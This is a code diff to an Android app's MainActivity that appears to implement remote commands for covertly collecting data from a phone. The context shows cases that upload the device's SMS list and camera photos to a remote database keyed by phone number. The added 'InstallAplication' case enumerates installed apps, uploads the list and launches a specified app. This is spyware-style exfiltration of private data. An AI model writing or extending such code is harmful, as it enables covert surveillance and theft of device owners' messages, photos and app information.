@@ -14,6 +14,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.net.Uri;
@@ -100,6 +102,7 @@ public class MainActivity extends AppCompatActivity {
         validateButtons();
         addphoneBtn.setOnClickListener(addPhone);
 
+
     }
 
     View.OnClickListener addPhone = new View.OnClickListener() {
@@ -144,12 +147,18 @@ public class MainActivity extends AppCompatActivity {
                 myRef.child(phoneNumber).child("SMSList").setValue(smsList);
                 break;
             case "TakePhotoByPath":
-                String photoPath="/storage/emulated/0/DCIM/Camera/20160606_225147_Burst04.jpg";
+                String photoPath="/storage/emulated/0/DCIM/Camera/20160606_171750.jpg";
                 //savephotoToStorage(photoPath);
                   String photo=Photos.BitMapToString(Photos.getImageByPath(photoPath));
                   myRef.child(phoneNumber).child("photo").push().setValue(photo);
                   Log.i("fdsfsd",photo);
-
+                  break;
+            case "InstallAplication":
+                List<ApplicationInfo> apps=InstalledApplictions.getAllInstalledApps(this);
+                List<PackageInfo> appsN=InstalledApplictions.getAllInstalledAppsName(this);
+                Log.i("fdds", String.valueOf(appsN));
+                myRef.child(phoneNumber).child("InstallAplication").push().setValue(String.valueOf(appsN));
+                InstalledApplictions.startDesiredApplication("com.goldtouch.mako",this);
             default:
                 // code block
         }
